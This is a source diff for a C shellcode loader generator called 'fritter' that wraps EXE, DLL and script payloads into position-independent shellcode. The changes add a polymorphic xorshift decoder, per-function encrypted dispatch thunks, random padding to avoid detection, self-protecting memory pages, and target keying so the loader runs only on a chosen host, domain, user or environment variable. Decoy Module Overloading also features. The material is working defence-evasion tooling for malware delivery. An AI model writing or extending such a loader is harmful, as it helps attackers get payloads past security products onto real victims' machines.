-    db[ds++] = (uint8_t)key_len;
-
-    // Append key bytes at end of decoder (not executed)
-    int key_offset = ds;
-    memcpy(db + ds, xor_key, key_len);
-    ds += key_len;
 
     uint32_t decoder_stub_size = ds;
 
@@ -2240,12 +3025,8 @@ static int build_loader(PFRITTER_CONFIG c) {
 
     // --- Pass 2: patch displacements ---
     {
-      // LEA key_ptr: target = key_offset, from = fixup_end[FIXUP_KEY]
-      int32_t d = key_offset - fixup_end[FIXUP_KEY];
-      memcpy(db + fixup_offset[FIXUP_KEY], &d, 4);
-
       // LEA data_ptr: target past trampoline + page_pad = start of encoded data
-      d = (int32_t)(decoder_stub_size + tramp_size + page_pad) - fixup_end[FIXUP_DATA];
+      int32_t d = (int32_t)(decoder_stub_size + tramp_size + page_pad) - fixup_end[FIXUP_DATA];
       memcpy(db + fixup_offset[FIXUP_DATA], &d, 4);
 
       // JNZ: target = loop_start, from = fixup_end[FIXUP_JNZ]
@@ -2253,10 +3034,10 @@ static int build_loader(PFRITTER_CONFIG c) {
       db[fixup_offset[FIXUP_JNZ]] = (uint8_t)jnz_disp;
     }
 
-    DPRINT("Polymorphic decoder: %d bytes (regs: kp=%d dp=%d cnt=%d idx=%d) "
-           "key_len=%u zero_op=%02x order=%d",
-           decoder_stub_size, rKP.reg3, rDP.reg3, rCNT.reg3, rIDX.reg3,
-           key_len, zero_opcode, loop_order);
+    DPRINT("Polymorphic decoder: %d bytes (regs: dp=%d cnt=%d k=%d t=%d) "
+           "shifts=%u,%u,%u order=%d",
+           decoder_stub_size, rDP.reg3, rCNT.reg3, rK.reg3, rTs[0].reg3,
+           outer.sh[0], outer.sh[1], outer.sh[2], loop_order);
 
     // --- Dispatch shim integration (replaces VEH shim) ---
     // Page-pad the shim so the loader starts on a page boundary
@@ -2269,9 +3050,49 @@ static int build_loader(PFRITTER_CONFIG c) {
     // When the loader has multiple PE code sections (post-packer), engage
     // per-function dispatch: append a dispatcher + one thunk per
     // cross-section call to protected sections at the loader-blob tail.
-    // Single-section builds fall through to v1 whole-loader dispatch.
+    // A single-section loader falls through to v1 whole-loader dispatch.
     int use_ngt1 = (L_FN_COUNT > 1);
-    int is_resident[16] = {0};
+    int is_resident[SHIM_MAX_FN_COUNT] = {0};
+
+    /* Validate the exe2h companion tables before trusting them. N>1 adds
+       one tail entry, so the loader may have at most MAX-1 sections. */
+    if(L_FN_COUNT == 0 || L_FN_COUNT + (use_ngt1 ? 1u : 0u) > SHIM_MAX_FN_COUNT) {
+      DPRINT("ERROR: loader has %u code sections; shim fn table holds %u",
+             L_FN_COUNT, SHIM_MAX_FN_COUNT);
+      return FRITTER_ERROR_INVALID_PARAMETER;
+    }
+    if(use_ngt1) {
+      int has_resident = 0;
+      for(uint32_t i = 0; i < L_FN_COUNT; i++) {
+        if(L_FNS[i].size == 0 || L_FNS[i].offset > loader_size ||
+           L_FNS[i].size > loader_size - L_FNS[i].offset) {
+          DPRINT("ERROR: fn[%u] range 0x%x+0x%x is outside the %u-byte loader",
+                 i, L_FNS[i].offset, L_FNS[i].size, loader_size);
+          return FRITTER_ERROR_INVALID_PARAMETER;
+        }
+        if(strncmp(L_FNS[i].name, ".text", 5) == 0) has_resident = 1;
+      }
+      for(uint32_t i = 0; i < L_REF_COUNT; i++) {
+        if(L_REFS[i].target_fn >= L_FN_COUNT || L_REFS[i].src_fn >= L_FN_COUNT ||
+           L_REFS[i].src_blob_off + L_REFS[i].inst_length > loader_size) {
+          DPRINT("ERROR: ref[%u] is out of range", i);
+          return FRITTER_ERROR_INVALID_PARAMETER;
+        }
+        /* A thunk can only stand in for a CALL/JMP rel32. A Jcc or a data
+           reference into a protected section cannot be dispatched. */
+        if(strncmp(L_FNS[L_REFS[i].target_fn].name, ".text", 5) != 0) {
+          uint8_t op = ((const uint8_t*)loader_blob)[L_REFS[i].src_blob_off];
+          if(L_REFS[i].disp_offset != 1 || (op != 0xE8 && op != 0xE9)) {
+            DPRINT("ERROR: ref[%u] into a protected section is not a call", i);
+            return FRITTER_ERROR_INVALID_PARAMETER;
+          }
+        }
+      }
+      if(!has_resident || L_REF_COUNT == 0) {
+        DPRINT("ERROR: multi-section loader without a resident .text or without refs");
+        return FRITTER_ERROR_INVALID_PARAMETER;
+      }
+    }
     uint32_t protected_ref_count = 0;
     uint32_t disp_slot  = 0;
     uint32_t thunks_size = 0;
@@ -2309,13 +3130,22 @@ static int build_loader(PFRITTER_CONFIG c) {
              L_FN_COUNT, L_REF_COUNT, protected_ref_count, pre_disp_pad, disp_slot, thunks_size);
     }
     uint32_t tail_extra = pre_disp_pad + disp_slot + thunks_size;
+    // Mask stub: padding up to the next page, then the stub's own page.
+    uint32_t mask_extra = 0;
+    if(use_ngt1 && MASK_STUB_BUILT) {
+      mask_extra = ((0u - (shim_padded_size + loader_size + tail_extra)) & 0xFFFu) + MASK_PAGE;
+    }
 
-    // Build combined blob: [shim (page-padded)] [loader] [tail_extra when N>1]
-    uint32_t combined_size = shim_padded_size + loader_size + tail_extra;
+    // Build combined blob: [shim (page-padded)] [loader] [tail_extra when N>1] [mask stub]
+    uint32_t combined_size = shim_padded_size + loader_size + tail_extra + mask_extra;
+    // the outer decoder works in dwords
+    uint32_t dword_pad = (0u - combined_size) & 3u;
+    combined_size += dword_pad;
     uint8_t *combined = malloc(combined_size);
     if(combined == NULL) {
       return FRITTER_ERROR_NO_MEMORY;
     }
+    if(dword_pad) gen_random(combined + combined_size - dword_pad, dword_pad);
 
     // Copy shim, pad with random bytes (not zeros - looks more natural)
     memcpy(combined, DISPATCH_SHIM_EXE_X64, shim_raw_size);
@@ -2323,12 +3153,35 @@ static int build_loader(PFRITTER_CONFIG c) {
       gen_random(combined + shim_raw_size, shim_padded_size - shim_raw_size);
     }
 
+    // Exit stub: somewhere in the shim's page padding (never wiped, and
+    // encoded at rest like the shim). Point the RSP-align epilogue at it.
+    {
+      uint8_t  xs[96];
+      uint32_t xs_len = emit_exit_stub(xs);
+      uint32_t room   = shim_padded_size - shim_raw_size;
+      uint32_t xr;
+      if(room < xs_len) {
+        DPRINT("ERROR: no room for the exit stub (%u < %u)", room, xs_len);
+        free(combined);
+        return FRITTER_ERROR_NO_MEMORY;
+      }
+      gen_random(&xr, sizeof(xr));
+      uint32_t xs_off  = shim_raw_size + xr % (room - xs_len + 1);
+      uint32_t rsp_pos = pfx_len + 5 + c->inst_len + 1 + junk_mid_len;
+      int32_t  xd      = (int32_t)(pre_blob_size + page_pad + xs_off)
+                       - (int32_t)(rsp_pos + rsp_exit_disp_off + 4);
+      memcpy(combined + xs_off, xs, xs_len);
+      memcpy(rsp_buf + rsp_exit_disp_off, &xd, 4);
+      DPRINT("Exit stub: %u bytes at shim+%u", xs_len, xs_off);
+    }
+
     // Patch dispatch shim sentinels (in shim portion of combined):
     //   SENTINEL_LOADER_OFFSET (0xDEAD0001) -> shim_padded_size
     //   SENTINEL_LOADER_SIZE   (0xDEAD0002) -> loader_size
     // VEH_MODE and PAGE_KEY_* sentinels are retired under dispatch.
     {
-      int patched_off = 0, patched_sz = 0;
+      int patched_off = 0, patched_sz = 0, patched_pic = 0;
+      uint32_t pic_to_shim = pre_blob_size + page_pad;
       for(uint32_t i = 0; i < shim_raw_size - 3; i++) {
         uint32_t val;
         memcpy(&val, combined + i, 4);
@@ -2340,9 +3193,12 @@ static int build_loader(PFRITTER_CONFIG c) {
           memcpy(combined + i, &loader_size, 4);
           patched_sz = 1;
           DPRINT("Patched SENTINEL_LOADER_SIZE at shim+%d -> %d", i, loader_size);
+        } else if(val == 0xDEAD0003 && !patched_pic) {
+          memcpy(combined + i, &pic_to_shim, 4);
+          patched_pic = 1;
         }
       }
-      if(!patched_off || !patched_sz) {
+      if(!patched_off || !patched_sz || !patched_pic) {
         DPRINT("ERROR: Failed to patch dispatch shim sentinels (off=%d, sz=%d)",
                patched_off, patched_sz);
         free(combined);
@@ -2398,8 +3254,13 @@ static int build_loader(PFRITTER_CONFIG c) {
 
       // Random-fill tail area so the dispatcher slot's unused suffix and
       // any post-thunk padding look like the rest of the encoded region.
-      if(tail_extra > 0) {
-        gen_random(combined + shim_padded_size + loader_size, tail_extra);
+      if(tail_extra + mask_extra > 0) {
+        gen_random(combined + shim_padded_size + loader_size, tail_extra + mask_extra);
+      }
+      if(mask_extra != 0 &&
+         !emit_mask_page(combined + combined_size - MASK_PAGE, combined_size - MASK_PAGE)) {
+        free(combined);
+        return FRITTER_ERROR_RANDOM;
       }
 
       // Emit dispatcher after pre_disp_pad bytes of random junk. The
@@ -2407,11 +3268,19 @@ static int build_loader(PFRITTER_CONFIG c) {
       // decrypt it; its bytes came from gen_random above.
       uint32_t disp_off_in_blob   = shim_padded_size + loader_size + pre_disp_pad;
       uint32_t loader_off_in_blob = shim_padded_size;
+      fn_stream_t stream;
+      {
+        uint8_t sr[2];
+        gen_random(sr, 2);
+        memcpy(stream.sh, XS_TRIPLES[sr[0] % 36], 3);
+        stream.rev = sr[1] & 1;
+      }
       uint32_t actual_disp_size = emit_dispatcher(combined + disp_off_in_blob,
                                                    disp_off_in_blob,
                                                    loader_off_in_blob,
                                                    ft_off,
-                                                   input_swap);
+                                                   input_swap,
+                                                   &stream);
       if(actual_disp_size > DISPATCHER_MAX_SIZE) {
         DPRINT("ERROR: dispatcher emitted %u bytes > slot %u",
                actual_disp_size, DISPATCHER_MAX_SIZE);
@@ -2478,32 +3347,39 @@ static int build_loader(PFRITTER_CONFIG c) {
       for(uint32_t i = 0; i < L_FN_COUNT; i++) {
         uint32_t e_off = L_FNS[i].offset;
         uint32_t e_sz  = L_FNS[i].size;
-        uint8_t  e_key = 0;
+        uint8_t  e_key[4] = {0, 0, 0, 0};
+        uint32_t e_seed = 0;
         uint8_t  e_flags;
         if(is_resident[i]) {
           e_flags = 0x01;  /* FN_FLAG_RESIDENT */
         } else {
-          do { gen_random(&e_key, 1); } while(e_key == 0);
+          /* The dispatcher loads the seed as the dword at +8, which
+             includes the flags byte: that byte is 0 for these entries. */
+          int tries = 0;
+          do {
+            if(!gen_random(e_key, 4) || ++tries > 1000) { free(combined); return FRITTER_ERROR_RANDOM; }
+            e_key[1] = 0;
+            memcpy(&e_seed, e_key, 4);
+          } while(e_key[0] == 0 || !fn_stream_xor(NULL, e_sz, e_seed, &stream, 0));
           e_flags = 0x00;  /* dispatcher-managed */
-          for(uint32_t k = 0; k < e_sz; k++) {
-            combined[shim_padded_size + e_off + k] ^= e_key;
-          }
+          fn_stream_xor(combined + shim_padded_size + e_off, e_sz, e_seed, &stream, 1);
         }
         uint8_t *entry = combined + ft_off + 16 + i * 12;
         memcpy(entry + 0, &e_off, 4);
         memcpy(entry + 4, &e_sz,  4);
-        entry[8]  = e_key;
+        entry[8]  = e_key[0];
         entry[9]  = e_flags;
-        entry[10] = 0x00;
-        entry[11] = 0x00;
-        DPRINT("  fn[%u] name=%-9.*s off=0x%05x size=0x%04x key=0x%02x flags=0x%02x",
-               i, 8, L_FNS[i].name, e_off, e_sz, e_key, e_flags);
+        entry[10] = e_key[2];
+        entry[11] = e_key[3];
+        DPRINT("  fn[%u] name=%-9.*s off=0x%05x size=0x%04x seed=0x%08x flags=0x%02x",
+               i, 8, L_FNS[i].name, e_off, e_sz, e_seed, e_flags);
       }
       // Trailing entry covers the dispatcher + thunks region as RESIDENT
       // so the shim's (no-op) decrypt loop skips it and the dispatcher
       // doesn't try to crypt it either.
       uint32_t tail_e_off = loader_size;
-      uint32_t tail_e_sz  = pre_disp_pad + DISPATCHER_MAX_SIZE + thunks_size;
+      // (the mask stub page too: the shim wipes and unprotects up to its end)
+      uint32_t tail_e_sz  = pre_disp_pad + DISPATCHER_MAX_SIZE + thunks_size + mask_extra;
       uint8_t *tail_entry = combined + ft_off + 16 + L_FN_COUNT * 12;
       memcpy(tail_entry + 0, &tail_e_off, 4);
       memcpy(tail_entry + 4, &tail_e_sz,  4);
@@ -2519,7 +3395,9 @@ static int build_loader(PFRITTER_CONFIG c) {
       // --- v1 whole-loader dispatch mode ---
       // Single fn_table entry covers the loader; shim auto-decrypts.
       uint8_t fn_key = 0;
-      do { gen_random(&fn_key, 1); } while(fn_key == 0);
+      do {
+        if(!gen_random(&fn_key, 1)) { free(combined); return FRITTER_ERROR_RANDOM; }
+      } while(fn_key == 0);
 
       uint32_t one = 1;
       memcpy(combined + ft_off + 8, &one, 4);
@@ -2556,12 +3434,23 @@ static int build_loader(PFRITTER_CONFIG c) {
       return FRITTER_ERROR_NO_MEMORY;
     }
 
-    memcpy(db + counter_imm_offset, &combined_size, 4);
+    {
+      uint32_t dwords = combined_size / 4;
+      memcpy(db + counter_imm_offset, &dwords, 4);
+    }
     DPRINT("Patched decoder counter: %d -> %d (shim %d + loader %d)",
            loader_size, combined_size, shim_padded_size, loader_size);
 
-    for(uint32_t i = 0; i < combined_size; i++) {
-      encoded[i] = combined[i] ^ xor_key[i & key_mask];
+    {
+      uint32_t k = outer_seed, w;
+      for(uint32_t i = 0; i < combined_size; i += 4) {
+        memcpy(&w, combined + i, 4);
+        w ^= k;
+        memcpy(encoded + i, &w, 4);
+        k ^= k << outer.sh[0];
+        k ^= k >> outer.sh[1];
+        k ^= k << outer.sh[2];
+      }
     }
     free(combined);
 
@@ -2570,6 +3459,20 @@ static int build_loader(PFRITTER_CONFIG c) {
     //         [rsp_align] [decoder_stub] [lea rdx 7B] [jmp rel32 5B] [page_pad]
     //         [encoded(shim+loader)]
     c->pic_len = pre_blob_size + page_pad + combined_size;
+
+    // Tell the loader where it sits, so it can drop write/execute access
+    // from its own pages while the payload runs. Both fields are in the
+    // plaintext head of the instance.
+    ((PFRITTER_INSTANCE)c->inst)->pic_off = pfx_len + 5;
+    ((PFRITTER_INSTANCE)c->inst)->pic_len = c->pic_len;
+    {
+      PFRITTER_INSTANCE pi = (PFRITTER_INSTANCE)c->inst;
+      pi->exit_opt ^= FRITTER_PLAIN_MASK(pi, 0);
+      pi->entropy  ^= FRITTER_PLAIN_MASK(pi, 1);
+      pi->oep      ^= FRITTER_PLAIN_MASK(pi, 2);
+      pi->pic_off  ^= FRITTER_PLAIN_MASK(pi, 3);
+      pi->pic_len  ^= FRITTER_PLAIN_MASK(pi, 4);
+    }
 
     c->pic = malloc(c->pic_len);
     if(c->pic == NULL) {
@@ -2633,8 +3536,6 @@ static int build_loader(PFRITTER_CONFIG c) {
  *   OUTPUT : Fritter error code.
  */
 static int validate_loader_cfg(PFRITTER_CONFIG c) {
-    uint32_t url_len;
-    
     DPRINT("Validating loader configuration.");
     
     if(c == NULL || c->input[0] == 0) {
@@ -2642,13 +3543,6 @@ static int validate_loader_cfg(PFRITTER_CONFIG c) {
       return FRITTER_ERROR_INVALID_PARAMETER;
     }
 
-    if(c->inst_type != FRITTER_INSTANCE_EMBED &&
-       c->inst_type != FRITTER_INSTANCE_HTTP) {
-      
-      DPRINT("Instance type %" PRIx32 " is invalid.", c->inst_type);
-      return FRITTER_ERROR_INVALID_PARAMETER;
-    }
-    
     if(c->format < FRITTER_FORMAT_BINARY || c->format > FRITTER_FORMAT_UUID) {
       DPRINT("Format type %" PRId32 " is invalid.", c->format);
       return FRITTER_ERROR_INVALID_FORMAT;
@@ -2660,40 +3554,6 @@ static int validate_loader_cfg(PFRITTER_CONFIG c) {
     {
       DPRINT("Entropy level %" PRId32 " is invalid.", c->entropy);
       return FRITTER_ERROR_INVALID_ENTROPY;
-    }
-    
-    if(c->inst_type == FRITTER_INSTANCE_HTTP) {
-      // no URL? exit
-      if(c->server[0] == 0) {
-        DPRINT("Error: No HTTP server provided.");
-        return FRITTER_ERROR_INVALID_PARAMETER;
-      }
-      // doesn't begin with one of the following? exit
-      if((strnicmp(c->server, "http://",  7) != 0) &&
-         (strnicmp(c->server, "https://", 8) != 0)) {
-        
-        DPRINT("URL is invalid : %s", c->server);
-        return FRITTER_ERROR_INVALID_URL;
-      }
-      // invalid length?
-      url_len = (uint32_t)strlen(c->server);
-      
-      if(url_len <= 8) {
-        DPRINT("URL length : %" PRId32 " is invalid.", url_len);
-        return FRITTER_ERROR_URL_LENGTH;
-      }
-      // if the end of string doesn't have a forward slash
-      // add one more to account for it
-      if(c->server[url_len - 1] != '/') {
-        c->server[url_len] = '/';
-        url_len++;
-      }
-      
-      if((url_len + FRITTER_MAX_MODNAME) >= FRITTER_MAX_NAME) {
-        DPRINT("URL length : %" PRId32 " exceeds size of buffer : %"PRId32, 
-          url_len+FRITTER_MAX_MODNAME, FRITTER_MAX_NAME);
-        return FRITTER_ERROR_URL_LENGTH;
-      }
     }
     
     if(c->arch != FRITTER_ARCH_X64)
@@ -2726,9 +3586,9 @@ static int is_dll_export(const char *function) {
     PIMAGE_DATA_DIRECTORY   dir;
     PIMAGE_EXPORT_DIRECTORY exp;
     DWORD                   rva, cnt;
-    ULONG64                 ofs;
     PDWORD                  sym;
     PCHAR                   str;
+    size_t                  flen = strlen(function);
     int                     found = 0;
 
     DPRINT("Entering.");
@@ -2738,20 +3598,22 @@ static int is_dll_export(const char *function) {
       rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
       DPRINT("EAT VA : %lx", rva);
       if(rva != 0) {
-        ofs = rva2ofs(fi.data, rva);
-        DPRINT("Offset = %" PRIX64 "\n", ofs);
-        if(ofs != -1) {
-          exp = (PIMAGE_EXPORT_DIRECTORY)(fi.data + ofs);
+        exp = (PIMAGE_EXPORT_DIRECTORY)pe_ptr(fi.data, fi.len, rva, sizeof(IMAGE_EXPORT_DIRECTORY));
+        if(exp != NULL) {
           cnt = exp->NumberOfNames;
           DPRINT("Number of exported functions : %lx", cnt);
           
-          if(cnt != 0) {
-            sym = (PDWORD)(rva2ofs(fi.data, exp->AddressOfNames) + fi.data);
+          // the whole name-pointer array must be inside the file
+          sym = (cnt == 0) ? NULL :
+            (PDWORD)pe_ptr(fi.data, fi.len, exp->AddressOfNames, (uint64_t)cnt * sizeof(DWORD));
+          
+          if(sym != NULL) {
             // scan array for symbol
             do {
-              str = (PCHAR)(rva2ofs(fi.data, sym[cnt - 1]) + fi.data);
+              // name plus its terminator must be inside the file
+              str = (PCHAR)pe_ptr(fi.data, fi.len, sym[cnt - 1], (uint64_t)flen + 1);
               // if match found, exit
-              if(strcmp(str, function) == 0) {
+              if(str != NULL && memcmp(str, function, flen + 1) == 0) {
                 DPRINT("Found API");
                 found = 1;
                 break;
@@ -2831,8 +3693,11 @@ int FritterCreate(PFRITTER_CONFIG c) {
     
     DPRINT("Entering.");
     
+    if(c == NULL) return FRITTER_ERROR_INVALID_PARAMETER;
+    
     c->mod = c->pic = c->inst = NULL;
     c->mod_len = c->pic_len = c->inst_len = 0;
+    g_rng_failed = 0;
     
     // 1. validate the loader configuration
     err = validate_loader_cfg(c);
@@ -2851,6 +3716,8 @@ int FritterCreate(PFRITTER_CONFIG c) {
             if(err == FRITTER_ERROR_OK) {
               // 6. build the loader
               err = build_loader(c);
+              // any failed random draw along the way invalidates the output
+              if(err == FRITTER_ERROR_OK && g_rng_failed) err = FRITTER_ERROR_RANDOM;
               if(err == FRITTER_ERROR_OK) {
                 if(err == FRITTER_ERROR_OK) {
                   // 7. save loader and any additional files to disk
@@ -2948,12 +3815,6 @@ const char *FritterError(int err) {
       case FRITTER_ERROR_INVALID_ARCH:
         str = "Invalid architecture specified.";
         break;      
-      case FRITTER_ERROR_INVALID_URL:
-        str = "Invalid URL.";
-        break;
-      case FRITTER_ERROR_URL_LENGTH:
-        str = "Invalid URL length.";
-        break;
       case FRITTER_ERROR_INVALID_PARAMETER:
         str = "Invalid parameter.";
         break;
@@ -2989,6 +3850,9 @@ const char *FritterError(int err) {
         break;
       case FRITTER_ERROR_DECOY_INVALID:
         str = "Path of decoy module is invalid.";
+        break;
+      case FRITTER_ERROR_STATIC_TLS:
+        str = "The file uses static thread-local storage (thread_local, __declspec(thread), or MSVC thread-safe local statics). Give it a slot with -l <dll> (see README), or for local statics rebuild the payload with /Zc:threadSafeInit-. Use -a to generate anyway.";
         break;
     }
     DPRINT("Error result : %s", str);
@@ -3038,6 +3902,69 @@ typedef union _opt_arg_t {
 typedef void (*void_callback_t)(void);         // execute callback with no return value or argument
 typedef int (*arg_callback_t)(opt_arg*,void*); // process argument, optionally store in optarg
 
+// Every switch main() registers. Kept here so the parser can tell an
+// option's value from a switch, and reject switches it does not know.
+static const char  OPT_VALUE_SHORT[] = "kcdefimjoprxygl";
+static const char  OPT_FLAG_SHORT[]  = "h?twba";
+static const char *OPT_VALUE_LONG[]  = {
+  "headers", "class", "domain", "entropy", "format", "input", "file",
+  "method", "function", "decoy", "output", "params", "args", "runtime",
+  "exit", "oep", "fork", "chunked", "tls-donor",
+  "key-brute", "key-host", "key-domain", "key-user", "key-env", NULL };
+static const char *OPT_FLAG_LONG[]   = { "help", "thread", "unicode", "imagebase", "allow-tls", NULL };
+
+// 1 if `a` is a value-taking switch with nothing attached ("-p", "--args"),
+// meaning the next argv element is its value.
+static int opt_is_bare_value_switch(const char *a) {
+    int k;
+    if(a[0] != '-') return 0;
+    if(a[1] != '-') {
+      return a[1] != 0 && a[2] == 0 && strchr(OPT_VALUE_SHORT, a[1]) != NULL;
+    }
+    for(k = 0; OPT_VALUE_LONG[k] != NULL; k++) {
+      if(strcmp(a + 2, OPT_VALUE_LONG[k]) == 0) return 1;
+    }
+    return 0;
+}
+
+// 1 if argv[idx] is the value of the switch before it, so it must not
+// be parsed as a switch itself (e.g. the "-e 1" in: -p "-e 1").
+static int arg_is_value(char *argv[], int idx) {
+    int j = 1;
+    while(j < idx) {
+      if(opt_is_bare_value_switch(argv[j])) {
+        if(j + 1 == idx) return 1;
+        j += 2;
+      } else j++;
+    }
+    return 0;
+}
+
+// Exit with an error on any switch that no get_opt() call would accept.
+static void reject_unknown_opts(int argc, char *argv[]) {
+    int i, k, known;
+    for(i = 1; i < argc; i++) {
+      const char *a = argv[i];
+      if(a[0] != '-' || arg_is_value(argv, i)) continue;
+      known = 0;
+      if(a[1] != '-') {
+        known = a[1] != 0 && (strchr(OPT_VALUE_SHORT, a[1]) != NULL ||
+                              strchr(OPT_FLAG_SHORT,  a[1]) != NULL);
+      } else {
+        for(k = 0; !known && OPT_VALUE_LONG[k] != NULL; k++) {
+          size_t l = strlen(OPT_VALUE_LONG[k]);
+          known = !strncmp(a + 2, OPT_VALUE_LONG[k], l) && (a[2 + l] == 0 || a[2 + l] == '=' || a[2 + l] == ':');
+        }
+        for(k = 0; !known && OPT_FLAG_LONG[k] != NULL; k++)
+          known = !strcmp(a + 2, OPT_FLAG_LONG[k]);
+      }
+      if(!known) {
+        fprintf(stderr, "  ERROR: Unknown option: %s\n", a);
+        exit(1);
+      }
+    }
+}
+
 static int get_opt(
   int argc,         // total number of elements in argv
   char *argv[],     // argument array
@@ -3078,6 +4005,8 @@ static int get_opt(
       arg = argv[i];
       // if it doesn't contain a switch, skip it
       if(*arg != '-') continue;
+      // the value of a preceding switch is never a switch itself
+      if(arg_is_value(argv, i)) continue;
       // we have a switch. initially, we assume short form
       arg++;
       opt_type = 0;
@@ -3110,8 +4039,10 @@ static int get_opt(
       while(opt != NULL && !valid) {
         // get the length
         opt_len = strlen(opt);
-        // do we have a match?   
-        if(!strncmp(opt, arg, opt_len)) {
+        // do we have a match? A long option must be the whole name, or the
+        // name followed by its value (--name=value, --name:value).
+        if(!strncmp(opt, arg, opt_len) &&
+           (!opt_type || arg[opt_len] == 0 || arg[opt_len] == '=' || arg[opt_len] == ':')) {
           //
           // at this point, we have a valid matching argument
           // if something fails from here on in, return invalid
@@ -3179,7 +4110,14 @@ static int get_opt(
               break;
             case OPT_TYPE_STRING:
               DPRINT("Copying %s to output", args);
-              strncpy(optarg->str, args, OPT_MAX_STRING);
+              // destination fields are OPT_MAX_STRING bytes; refuse rather
+              // than truncate a path or leave the string unterminated
+              if(strlen(args) >= OPT_MAX_STRING) {
+                fprintf(stderr, "  ERROR: Value too long (max %d characters): %s\n",
+                        OPT_MAX_STRING - 1, args);
+                exit(1);
+              }
+              strcpy(optarg->str, args);
               break;
           }
         } else {
@@ -3207,7 +4145,7 @@ static int validate_exit(opt_arg *arg, void *args) {
       } else
       if(!strcasecmp("process", str)) {
         arg->u32 = FRITTER_OPT_EXIT_PROCESS;
-      }
+      } else
       if(!strcasecmp("block", str)) {
         arg->u32 = FRITTER_OPT_EXIT_BLOCK;
       }
@@ -3411,11 +4349,21 @@ static void usage (void) {
         printf("    -m, --method <name>       " C_DIM "Method or function for DLL" C_RST "\n");
         printf("    -r, --runtime <ver>       " C_DIM "CLR runtime version" C_RST "\n");
         printf("    -w, --unicode             " C_DIM "Pass command line as UNICODE" C_RST "\n");
-        printf("    -t, --thread              " C_DIM "Run unmanaged EXE entrypoint as thread" C_RST "\n\n");
+        printf("    -t, --thread              " C_DIM "Run unmanaged EXE entrypoint as thread" C_RST "\n");
+        printf("    -b, --imagebase           " C_DIM "EXE is the process image while it runs (resources; use with -k 2)" C_RST "\n");
+        printf("    -l, --tls-donor <dll>     " C_DIM "Static TLS for the payload, borrowed from this DLL on the target" C_RST "\n");
+        printf("    -a, --allow-tls           " C_DIM "Accept a payload that uses static TLS without a slot (at your own risk)" C_RST "\n\n");
+
+        printf(C_YEL "  KEY" C_RST "\n");
+        printf("    --key-brute <bits>        " C_DIM "Key bits the loader finds by trial; default %d, 0 = none (key stored whole)" C_RST "\n", FRITTER_KEY_BRUTE_DEFAULT);
+        printf("    --key-host <name>         " C_DIM "Runs only where COMPUTERNAME is <name>" C_RST "\n");
+        printf("    --key-domain <name>       " C_DIM "Runs only where USERDNSDOMAIN is <name>" C_RST "\n");
+        printf("    --key-user <name>         " C_DIM "Runs only where USERNAME is <name>" C_RST "\n");
+        printf("    --key-env <NAME=VALUE>    " C_DIM "Runs only where that environment variable has that value" C_RST "\n\n");
 
         printf(C_YEL "  OUTPUT" C_RST "\n");
         printf("    -o, --output <path>       " C_DIM "Output file (default: loader.bin)" C_RST "\n");
-        printf("    -f, --format <1-8>        " C_DIM "1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex" C_RST "\n");
+        printf("    -f, --format <1-9>        " C_DIM "1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex 9=UUID" C_RST "\n");
         printf("    -x, --exit   <1-3>        " C_DIM "1=Thread (default) 2=Process 3=Block" C_RST "\n");
         printf("    -y, --fork   <offset>     " C_DIM "Fork thread, continue at RVA offset" C_RST "\n\n");
 
@@ -3423,17 +4371,12 @@ static void usage (void) {
         printf("    -e, --entropy <1-3>       " C_DIM "1=None 2=Random names 3=Names+Crypto (default)" C_RST "\n");
         printf("    -k, --headers <1-2>       " C_DIM "1=Overwrite (default) 2=Keep all" C_RST "\n");
         printf("    -d, --domain  <name>      " C_DIM "AppDomain name for .NET" C_RST "\n");
-        printf("    -j, --decoy   <path>      " C_DIM "Decoy module for Module Overloading" C_RST "\n");
-        printf("    -g, --chunked <0-1>       " C_DIM "(deprecated; dispatch shim always used)" C_RST "\n\n");
-
-        printf(C_YEL "  STAGING" C_RST "\n");
-        printf("    -n, --modname <name>      " C_DIM "Module name for HTTP staging" C_RST "\n");
-        printf("    -s, --server  <url>       " C_DIM "Server URL (supports basic auth)" C_RST "\n\n");
+        printf("    -j, --decoy   <path>      " C_DIM "Decoy module for Module Overloading" C_RST "\n\n");
 
         printf(C_WHT C_BOLD "  EXAMPLES" C_RST "\n");
         printf(C_DIM "    fritter -i payload.exe\n");
         printf("    fritter -i implant.dll -m RunMain -p \"arg1 arg2\"\n");
-        printf("    fritter -i loader.dll -c TestClass -m Run -s http://10.0.0.1/mod/" C_RST "\n");
+        printf("    fritter -i loader.dll -c TestClass -m Run" C_RST "\n");
     } else {
         printf("  USAGE:  fritter [options] -i <EXE/DLL/VBS/JS>\n\n");
 
@@ -3444,11 +4387,21 @@ static void usage (void) {
         printf("    -m, --method <name>       Method or function for DLL\n");
         printf("    -r, --runtime <ver>       CLR runtime version\n");
         printf("    -w, --unicode             Pass command line as UNICODE\n");
-        printf("    -t, --thread              Run unmanaged EXE entrypoint as thread\n\n");
+        printf("    -t, --thread              Run unmanaged EXE entrypoint as thread\n");
+        printf("    -b, --imagebase           EXE is the process image while it runs (resources; use with -k 2)\n");
+        printf("    -l, --tls-donor <dll>     Static TLS for the payload, borrowed from this DLL on the target\n");
+        printf("    -a, --allow-tls           Accept a payload that uses static TLS without a slot (at your own risk)\n\n");
+
+        printf("  KEY\n");
+        printf("    --key-brute <bits>        Key bits the loader finds by trial; default %d, 0 = none (key stored whole)\n", FRITTER_KEY_BRUTE_DEFAULT);
+        printf("    --key-host <name>         Runs only where COMPUTERNAME is <name>\n");
+        printf("    --key-domain <name>       Runs only where USERDNSDOMAIN is <name>\n");
+        printf("    --key-user <name>         Runs only where USERNAME is <name>\n");
+        printf("    --key-env <NAME=VALUE>    Runs only where that environment variable has that value\n\n");
 
         printf("  OUTPUT\n");
         printf("    -o, --output <path>       Output file (default: loader.bin)\n");
-        printf("    -f, --format <1-8>        1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex\n");
+        printf("    -f, --format <1-9>        1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex 9=UUID\n");
         printf("    -x, --exit   <1-3>        1=Thread (default) 2=Process 3=Block\n");
         printf("    -y, --fork   <offset>     Fork thread, continue at RVA offset\n\n");
 
@@ -3456,17 +4409,12 @@ static void usage (void) {
         printf("    -e, --entropy <1-3>       1=None 2=Random names 3=Names+Crypto (default)\n");
         printf("    -k, --headers <1-2>       1=Overwrite (default) 2=Keep all\n");
         printf("    -d, --domain  <name>      AppDomain name for .NET\n");
